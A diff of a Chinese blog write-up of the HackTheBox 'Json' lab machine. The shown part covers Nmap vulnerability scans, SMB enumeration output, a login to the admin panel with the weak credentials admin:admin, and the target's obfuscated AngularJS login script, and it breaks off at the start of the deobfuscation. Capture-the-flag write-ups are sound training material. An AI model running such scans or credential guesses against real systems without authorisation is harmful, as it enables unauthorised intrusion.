@@ -44,7 +44,7 @@
   <meta itemprop="description" content="初始侦察 Nmap 端口扫描 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo nmap --min-rate 10000 -p- 10.129.227.191 -oA port [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 01:13 EST Nmap scan report for 10.129.227.191 Host is up (0.10s latency). Not shown: 65521 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5985/tcp open wsman 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 11.14 seconds 提取端口做备用。">
   <meta itemprop="datePublished" content="2026-03-01T14:00:00+08:00">
   <meta itemprop="dateModified" content="2026-03-01T14:00:00+08:00">
-  <meta itemprop="wordCount" content="715">
+  <meta itemprop="wordCount" content="2317">
   <meta itemprop="keywords" content="Hack,Windows,Writeup,HTB">
 
   <meta name="twitter:card" content="summary">
@@ -122,7 +122,7 @@
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        4 minutes
+        11 minutes
 
         
       </p>
@@ -150,6 +150,13 @@
     </li>
     <li><a href="#21-ftp-渗透">21-ftp 渗透</a></li>
     <li><a href="#445-smb-渗透">445-Smb 渗透</a></li>
+    <li><a href="#web-80-端口渗透">Web-80 端口渗透</a></li>
+    <li><a href="#提权枚举">提权枚举</a></li>
+    <li><a href="#其他提权思路">其他提权思路</a>
+      <ul>
+        <li><a href="#土豆提权">土豆提权</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
         </aside>
@@ -246,7 +253,51 @@
 </span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 69.77 seconds
 </span></span></code></pre></div><h3 id="nmap-漏洞脚本扫描">Nmap 漏洞脚本扫描</h3>
-<p>对 <code>hosts</code> 文件添加域解析。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --script<span style="color:#f92672">=</span>vuln -p21,80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49157,49158 10.129.227.191
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-03-01 21:35 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> json.htb <span style="color:#f92672">(</span>10.129.227.191<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>| http-fileupload-exploiter: 
+</span></span><span style="display:flex;"><span>|   
+</span></span><span style="display:flex;"><span>|     Couldn<span style="color:#e6db74">&#39;t find a file-type field.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Couldn&#39;</span>t find a file-type field.
+</span></span><span style="display:flex;"><span>|   
+</span></span><span style="display:flex;"><span>|     Couldn<span style="color:#e6db74">&#39;t find a file-type field.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Couldn&#39;</span>t find a file-type field.
+</span></span><span style="display:flex;"><span>|   
+</span></span><span style="display:flex;"><span>|_    Couldn<span style="color:#e6db74">&#39;t find a file-type field.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-csrf: Couldn&#39;</span>t find any CSRF vulnerabilities.
+</span></span><span style="display:flex;"><span>|_http-stored-xss: Couldn<span style="color:#e6db74">&#39;t find any stored XSS vulnerabilities.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-dombased-xss: Couldn&#39;</span>t find any DOM based XSS.
+</span></span><span style="display:flex;"><span>| http-enum: 
+</span></span><span style="display:flex;"><span>|_  /login.html: Possible admin folder
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman
+</span></span><span style="display:flex;"><span>47001/tcp open  winrm
+</span></span><span style="display:flex;"><span>49152/tcp open  unknown
+</span></span><span style="display:flex;"><span>49153/tcp open  unknown
+</span></span><span style="display:flex;"><span>49154/tcp open  unknown
+</span></span><span style="display:flex;"><span>49155/tcp open  unknown
+</span></span><span style="display:flex;"><span>49156/tcp open  unknown
+</span></span><span style="display:flex;"><span>49157/tcp open  unknown
+</span></span><span style="display:flex;"><span>49158/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span>|_smb-vuln-ms10-054: false
+</span></span><span style="display:flex;"><span>|_samba-vuln-cve-2012-1182: No accounts left to try
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 482.23 seconds
+</span></span></code></pre></div><p>对 <code>hosts</code> 文件添加域解析。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ sudo sed -i <span style="color:#e6db74">&#39;1i 10.129.227.191 json.htb&#39;</span> /etc/hosts 
 </span></span><span style="display:flex;"><span>                           
@@ -304,6 +355,374 @@
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">0</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Something weird happened on <span style="color:#f92672">(</span>10.129.227.191<span style="color:#f92672">)</span> Error occurs <span style="color:#66d9ef">while</span> reading from remote<span style="color:#f92672">(</span>104<span style="color:#f92672">)</span> on line <span style="color:#ae81ff">1015</span>                    
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>使用 <code>enum4linux</code> 进行进一步的枚举。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ enum4linux-ng -A json.htb
+</span></span><span style="display:flex;"><span>ENUM4LINUX - next generation <span style="color:#f92672">(</span>v1.3.7<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">==========================</span>
+</span></span><span style="display:flex;"><span>|    Target Information    |
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">==========================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target ........... json.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Username ......... <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Random Username .. <span style="color:#e6db74">&#39;cfxfhmar&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Password ......... <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Timeout .......... <span style="color:#ae81ff">5</span> second<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=================================</span>
+</span></span><span style="display:flex;"><span>|    Listener Scan on json.htb    |
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking LDAP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Could not connect to LDAP on 389/tcp: connection refused
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking LDAPS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Could not connect to LDAPS on 636/tcp: connection refused
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking SMB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SMB is accessible on 445/tcp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking SMB over NetBIOS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SMB over NetBIOS is accessible on 139/tcp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=======================================================</span>
+</span></span><span style="display:flex;"><span>|    NetBIOS Names and Workgroup/Domain <span style="color:#66d9ef">for</span> json.htb    |
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=======================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got domain/workgroup name: WORKGROUP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Full NetBIOS names information:
+</span></span><span style="display:flex;"><span>- WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+</span></span><span style="display:flex;"><span>- JSON            &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+</span></span><span style="display:flex;"><span>- JSON            &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+</span></span><span style="display:flex;"><span>- MAC Address <span style="color:#f92672">=</span> 00-50-56-B9-D4-5B
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=====================================</span>
+</span></span><span style="display:flex;"><span>|    SMB Dialect Check on json.htb    |
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=====================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying on 445/tcp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Supported dialects and settings:
+</span></span><span style="display:flex;"><span>Supported dialects:
+</span></span><span style="display:flex;"><span>  SMB 1.0: true
+</span></span><span style="display:flex;"><span>  SMB 2.0.2: true
+</span></span><span style="display:flex;"><span>  SMB 2.1: true
+</span></span><span style="display:flex;"><span>  SMB 3.0: true
+</span></span><span style="display:flex;"><span>  SMB 3.1.1: false
+</span></span><span style="display:flex;"><span>Preferred dialect: SMB 3.0
+</span></span><span style="display:flex;"><span>SMB1 only: false
+</span></span><span style="display:flex;"><span>SMB signing required: false
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=======================================================</span>
+</span></span><span style="display:flex;"><span>|    Domain Information via SMB session <span style="color:#66d9ef">for</span> json.htb    |
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=======================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerating via unauthenticated SMB session on 445/tcp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found domain information via SMB
+</span></span><span style="display:flex;"><span>NetBIOS computer name: JSON
+</span></span><span style="display:flex;"><span>NetBIOS domain name: <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>DNS domain: json
+</span></span><span style="display:flex;"><span>FQDN: json
+</span></span><span style="display:flex;"><span>Derived membership: workgroup member
+</span></span><span style="display:flex;"><span>Derived domain: unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=====================================</span>
+</span></span><span style="display:flex;"><span>|    RPC Session Check on json.htb    |
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=====================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Check <span style="color:#66d9ef">for</span> anonymous access <span style="color:#f92672">(</span>null session<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Could not establish null session: STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Check <span style="color:#66d9ef">for</span> guest access
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Could not establish guest session: STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Sessions failed, neither null nor user sessions were possible
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">===========================================</span>
+</span></span><span style="display:flex;"><span>|    OS Information via RPC <span style="color:#66d9ef">for</span> json.htb    |
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">===========================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerating via unauthenticated SMB session on 445/tcp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found OS information via SMB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerating via <span style="color:#e6db74">&#39;srvinfo&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Skipping <span style="color:#e6db74">&#39;srvinfo&#39;</span> run, not possible with provided credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> After merging OS information we have the following result:
+</span></span><span style="display:flex;"><span>OS: Windows Server <span style="color:#ae81ff">2012</span> R2 Datacenter <span style="color:#ae81ff">9600</span>
+</span></span><span style="display:flex;"><span>OS version: <span style="color:#e6db74">&#39;6.3&#39;</span>
+</span></span><span style="display:flex;"><span>OS release: <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>OS build: <span style="color:#e6db74">&#39;9600&#39;</span>
+</span></span><span style="display:flex;"><span>Native OS: Windows Server <span style="color:#ae81ff">2012</span> R2 Datacenter <span style="color:#ae81ff">9600</span>
+</span></span><span style="display:flex;"><span>Native LAN manager: Windows Server <span style="color:#ae81ff">2012</span> R2 Datacenter 6.3
+</span></span><span style="display:flex;"><span>Platform id: null
+</span></span><span style="display:flex;"><span>Server type: null
+</span></span><span style="display:flex;"><span>Server type string: null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Aborting remainder of tests since sessions failed, rerun with valid credentials
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Completed after 11.72 seconds
+</span></span></code></pre></div><p><code>json.htb</code> 属于 <code>WORKGROUP</code> 工作组，<code>NetBIOS</code> 的名称为 <code>JSON</code>，在 445/tcp 和 139/tcp 端口上分别开启了 SMB 和 NetBIOS 服务，主机支持多种 SMB 协议，首选协议为 SMB 3.0，未禁用 SMB 1.0，可能可以利用旧版 SMB 漏洞，确认目标操作系统为 <code>Windows Server 2012 R2 Datacenter</code>。</p>
+<p>在连接 LDAP 和 LDAPS 端口时，389/tcp、636/tcp 端口均拒绝服务，这表明这些服务未开启或被防火墙阻止，Nmap 也没法发现开放。在尝试通过会话或随即用户进行访问 RPC 连接时，均因为权限不足而失败，目标主机对未认证用户的访问控制较为严格。</p>
+<h2 id="web-80-端口渗透">Web-80 端口渗透</h2>
+<p>打开 Web-80 界面是一个登入框。</p>
+<p><img src="Pasted%20image%2020260302110209.png" alt=""></p>
+<p>使用弱密码 <code>admin:admin</code> 成功进入后台。</p>
+<p><img src="Pasted%20image%2020260302110414.png" alt=""></p>
+<p>在底部的 <code>Development Approach</code> 处写道这个后台管理系统可能是 <code>SB Admin 2</code>。</p>
+<p><img src="Pasted%20image%2020260302110511.png" alt=""></p>
+<p>查看源码进一步验证了这个后台管理系统是 <code>SB amin 2</code>。</p>
+<p><img src="Pasted%20image%2020260302110712.png" alt=""></p>
+<p>继续翻阅源码，查看 <code>js/app.min.js</code>，发现它包含自定义逻辑。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-app.min.js" data-lang="app.min.js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0xd18f</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;\x70\x72\x69\x6E\x63\x69\x70\x61\x6C\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72&#34;</span>, <span style="color:#e6db74">&#34;\x24\x68\x74\x74\x70&#34;</span>, <span style="color:#e6db74">&#34;\x24\x73\x63\x6F\x70\x65&#34;</span>, <span style="color:#e6db74">&#34;\x24\x63\x6F\x6F\x6B\x69\x65\x73&#34;</span>, <span style="color:#e6db74">&#34;\x4F\x41\x75\x74\x68\x32&#34;</span>, <span style="color:#e6db74">&#34;\x67\x65\x74&#34;</span>, <span style="color:#e6db74">&#34;\x55\x73\x65\x72\x4E\x61\x6D\x65&#34;</span>, <span style="color:#e6db74">&#34;\x4E\x61\x6D\x65&#34;</span>, <span style="color:#e6db74">&#34;\x64\x61\x74\x61&#34;</span>, <span style="color:#e6db74">&#34;\x72\x65\x6D\x6F\x76\x65&#34;</span>, <span style="color:#e6db74">&#34;\x68\x72\x65\x66&#34;</span>, <span style="color:#e6db74">&#34;\x6C\x6F\x63\x61\x74\x69\x6F\x6E&#34;</span>, <span style="color:#e6db74">&#34;\x6C\x6F\x67\x69\x6E\x2E\x68\x74\x6D\x6C&#34;</span>, <span style="color:#e6db74">&#34;\x74\x68\x65\x6E&#34;</span>, <span style="color:#e6db74">&#34;\x2F\x61\x70\x69\x2F\x41\x63\x63\x6F\x75\x6E\x74\x2F&#34;</span>, <span style="color:#e6db74">&#34;\x63\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72&#34;</span>, <span style="color:#e6db74">&#34;\x6C\x6F\x67\x69\x6E\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72&#34;</span>, <span style="color:#e6db74">&#34;\x63\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;\x65\x72\x72\x6F\x72&#34;</span>, <span style="color:#e6db74">&#34;\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C&#34;</span>, <span style="color:#e6db74">&#34;\x6C\x6F\x67\x69\x6E&#34;</span>, <span style="color:#e6db74">&#34;\x6D\x65\x73\x73\x61\x67\x65&#34;</span>, <span style="color:#e6db74">&#34;\x49\x6E\x76\x61\x6C\x69\x64\x20\x43\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73\x2E&#34;</span>, <span style="color:#e6db74">&#34;\x73\x68\x6F\x77&#34;</span>, <span style="color:#e6db74">&#34;\x6C\x6F\x67&#34;</span>, <span style="color:#e6db74">&#34;\x2F\x61\x70\x69\x2F\x74\x6F\x6B\x65\x6E&#34;</span>, <span style="color:#e6db74">&#34;\x70\x6F\x73\x74&#34;</span>, <span style="color:#e6db74">&#34;\x6A\x73\x6F\x6E&#34;</span>, <span style="color:#e6db74">&#34;\x6E\x67\x43\x6F\x6F\x6B\x69\x65\x73&#34;</span>, <span style="color:#e6db74">&#34;\x6D\x6F\x64\x75\x6C\x65&#34;</span>]; <span style="color:#a6e22e">angular</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">30</span>]](<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">28</span>], [<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">29</span>]])[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">15</span>]](<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">16</span>], [<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">1</span>], <span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">2</span>], <span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">3</span>], <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_0x30f6x1</span>, <span style="color:#a6e22e">_0x30f6x2</span>, <span style="color:#a6e22e">_0x30f6x3</span>) { <span style="color:#a6e22e">_0x30f6x2</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">17</span>]] <span style="color:#f92672">=</span> { <span style="color:#a6e22e">UserName</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">18</span>], <span style="color:#a6e22e">Password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">18</span>] }; <span style="color:#a6e22e">_0x30f6x2</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">19</span>]] <span style="color:#f92672">=</span> { <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">18</span>], <span style="color:#a6e22e">show</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span> }; <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x30f6x4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x30f6x3</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">5</span>]](<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">4</span>]); <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x30f6x4</span>) { window[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">11</span>]][<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">10</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">20</span>] }; <span style="color:#a6e22e">_0x30f6x2</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">21</span>]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () { <span style="color:#a6e22e">_0x30f6x1</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">27</span>]](<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">26</span>], <span style="color:#a6e22e">_0x30f6x2</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">17</span>]])[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">13</span>]](<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_0x30f6x5</span>) { window[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">11</span>]][<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">10</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">20</span>] }, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_0x30f6x6</span>) { <span style="color:#a6e22e">_0x30f6x2</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">19</span>]][<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">22</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">23</span>]; <span style="color:#a6e22e">_0x30f6x2</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">19</span>]][<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">24</span>]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>; <span style="color:#a6e22e">console</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">25</span>]](<span style="color:#a6e22e">_0x30f6x6</span>) }) } }])[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">15</span>]](<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">0</span>], [<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">1</span>], <span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">2</span>], <span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">3</span>], <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_0x30f6x1</span>, <span style="color:#a6e22e">_0x30f6x2</span>, <span style="color:#a6e22e">_0x30f6x3</span>) { <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x30f6x4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x30f6x3</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">5</span>]](<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">4</span>]); <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x30f6x4</span>) { <span style="color:#a6e22e">_0x30f6x1</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">5</span>]](<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">14</span>], { <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> { <span style="color:#e6db74">&#34;\x42\x65\x61\x72\x65\x72&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">_0x30f6x4</span> } })[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">13</span>]](<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_0x30f6x5</span>) { <span style="color:#a6e22e">_0x30f6x2</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">6</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x30f6x5</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">8</span>]][<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">7</span>]] }, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_0x30f6x6</span>) { <span style="color:#a6e22e">_0x30f6x3</span>[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">9</span>]](<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">4</span>]); window[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">11</span>]][<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">10</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">12</span>] }) } <span style="color:#66d9ef">else</span> { window[<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">11</span>]][<span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">10</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0xd18f</span>[<span style="color:#ae81ff">12</span>] } }])
+</span></span></code></pre></div><p>发现源码被混淆了，使用 AI 工具解混淆。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>// 定义一个名为 <span style="color:#e6db74">&#34;json&#34;</span> 的 AngularJS 模块，依赖 ngCookies
+</span></span><span style="display:flex;"><span>angular.module<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;json&#34;</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;ngCookies&#34;</span><span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 登录控制器
